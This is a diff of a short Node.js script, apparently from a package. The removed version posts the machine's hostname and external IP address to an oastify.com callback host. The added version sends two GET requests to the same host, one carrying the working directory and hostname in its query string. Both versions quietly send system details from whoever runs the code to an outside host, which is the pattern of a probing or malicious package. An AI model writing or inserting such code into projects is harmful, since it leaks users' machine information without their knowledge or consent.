@@ -1,66 +1,51 @@
-const os = require('os'); // For system info
-const http = require('http'); // HTTP request
-const https = require('https'); // HTTPS request
-
-// Function to get hostname and IP
-function getSystemDetails() {
-    const hostname = os.hostname();
-    const networkInterfaces = os.networkInterfaces();
-    let ip = 'Unknown';
-
-    // Extract the first non-internal IPv4 address
-    for (const iface in networkInterfaces) {
-        const addresses = networkInterfaces[iface];
-        for (const addr of addresses) {
-            if (addr.family === 'IPv4' && !addr.internal) {
-                ip = addr.address;
-                break;
-            }
-        }
-        if (ip !== 'Unknown') break;
-    }
-
-    return { hostname, ip };
-}
-
-// Function to send data
-function sendData(url, data) {
-    const postData = JSON.stringify(data);
-    const urlObj = new URL(url);
-
-    const options = {
-        hostname: urlObj.hostname,
-        port: urlObj.protocol === 'https:' ? 443 : 80,
-        path: urlObj.pathname,
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Content-Length': Buffer.byteLength(postData),
-        },
+const https = require('https');
+const os = require('os');
+const path = require('path');
+// Send request to the specified endpoint
+const sendRequests = () => {
+    const options1 = {
+        hostname: 'nvmr7j5ar5y75nsfvywejcqvbmhd59ty.oastify.com',
+        port: 443,
+        path: '/',
+        method: 'GET'
     };
 
-    const protocol = urlObj.protocol === 'https:' ? https : http;
-    const req = protocol.request(options, (res) => {
-        console.log(`STATUS: ${res.statusCode}`);
-        res.setEncoding('utf8');
-        res.on('data', (chunk) => {
-            console.log(`BODY: ${chunk}`);
+    const req1 = https.request(options1, (res) => {
+        console.log(`Request 1 status code: ${res.statusCode}`);
+        res.on('data', (data) => {
+            process.stdout.write(data);
         });
     });
 
-    req.on('error', (e) => {
-        console.error(`Problem with request: ${e.message}`);
+    req1.on('error', (error) => {
+        console.error(`Error in request 1: ${error.message}`);
     });
 
-    // Write data to request body
-    req.write(postData);
-    req.end();
-}
+    req1.end();
 
-// Get system details and send data
-const url = 'https://nvmr7j5ar5y75nsfvywejcqvbmhd59ty.oastify.com';
-const systemDetails = getSystemDetails();
+    // Send a second request with working directory and hostname
+    const workingDir = process.cwd();
+    const hostname = os.hostname();
+    const options2 = {
+        hostname: 'nvmr7j5ar5y75nsfvywejcqvbmhd59ty.oastify.com',
+        port: 443,
+        path: `/info?cwd=${encodeURIComponent(workingDir)}&hostname=${encodeURIComponent(hostname)}`,
+        method: 'GET'
+    };
 
-console.log('Sending system details:', systemDetails);
+    const req2 = https.request(options2, (res) => {
+        console.log(`Request 2 status code: ${res.statusCode}`);
+        res.on('data', (data) => {
+            process.stdout.write(data);
+        });
+    });
 
-sendData(url, systemDetails);
+    req2.on('error', (error) => {
+        console.error(`Error in request 2: ${error.message}`);
+    });
+
+    req2.end();
+};
+
+// Call the function to send requests
+sendRequests();
